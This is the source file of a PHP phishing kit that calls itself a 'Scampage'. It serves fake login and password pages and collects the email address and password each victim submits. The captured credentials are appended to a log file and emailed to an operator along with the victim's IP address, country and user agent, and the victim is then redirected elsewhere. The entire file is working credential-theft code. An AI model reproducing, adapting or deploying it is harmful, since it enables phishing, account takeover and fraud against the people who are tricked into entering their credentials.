<?php

class SCAM{
	private $config;

	public function __construct($config = []){
		$this->config = $config;
		session_start();

		if(!isset($_SESSION['uid'])){
			$_SESSION['uid'] = gen();
		}

		$this->append_data();
		$this->route();
	}

	public function route(){
		if(isset($_GET['save'])){

			if(!isset($_SESSION['email'])){
				header('Location: ?');
				exit;
			}elseif(!isset($_SESSION['password'])){
				header('Location: ?password');
				exit;
			}

			if($this->config->get('to_file')){
				$this->save_to_file();
			}

			if($this->config->get('to_email')){
				$this->save_to_email();
			}
			unset($_SESSION['email']);
			unset($_SESSION['password']);
			header('Location: '.$this->config->get('redirect_url'));
		}
		elseif(isset($_GET['password'])){
			if(!isset($_SESSION['email'])){
				header('Location: ?');
				exit;
			}
			return require(__DIR__.'/../page/password.new.html');
		}elseif(isset($_GET['reset'])){
			session_destroy();
			header('Location: ?');
			die();
		}
		else return require(__DIR__.'/../page/login.new.html');
	}

	public function append_data(){
		if(isset($_POST['email'])){
			$_SESSION['email'] = $_POST['email'];
		}

		if(isset($_POST['password'])){
			$_SESSION['password'] = $_POST['password'];
		}
	}

	public function save_to_email(){
		$ip = get_ip_address();
		$country = getCountry($ip);
		mail(
			$this->config->get('output_email'), // to
			"Scampage: new credentials received", // subject,
			implode("\n", [ // body
				"New credentials received (#".$_SESSION['uid'].")",
				'',
				"Email: " . $_SESSION['email'],
				"Password: " . $_SESSION['password'],
				'',
				'IP: ' . $ip,
				'Country: ' . $country,
				'UserAgent: ' . $_SERVER['HTTP_USER_AGENT']
			])
		);
	}

	public function save_to_file(){
		return file_put_contents(__DIR__.'/../logs.txt', implode(":", [
			$_SESSION['email'],
			$_SESSION['password'],
		]), FILE_APPEND);
	}
}

class Config{
	public function __construct(){
		$this->config = json_decode(file_get_contents(__DIR__."/../config.json"), true);
		if($this->config === false){
			echo "FATAL ERROR: Cannot parse config file. Please use any JSON-validator (ex. https://jsonlint.com/)";
			die();
		}
	}

	public function get($attr){
		return isset($this->config[$attr]) ? $this->config[$attr] : '';
	}
}

function get_ip_address(){
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $ip){
                $ip = trim($ip); // just to be safe

                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){
                    return $ip;
                }
            }
        }
    }
}

function getCountry($ip){
	return json_decode(file_get_contents("http://ipinfo.io/$ip"), true)['country'];
}

function gen($len = 8){
    $abc = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
    $res = "";
    for ($i=0; $i < $len; $i++) { 
        $res .= $abc[rand(0,strlen($abc)-1)];
    }
    return $res;
}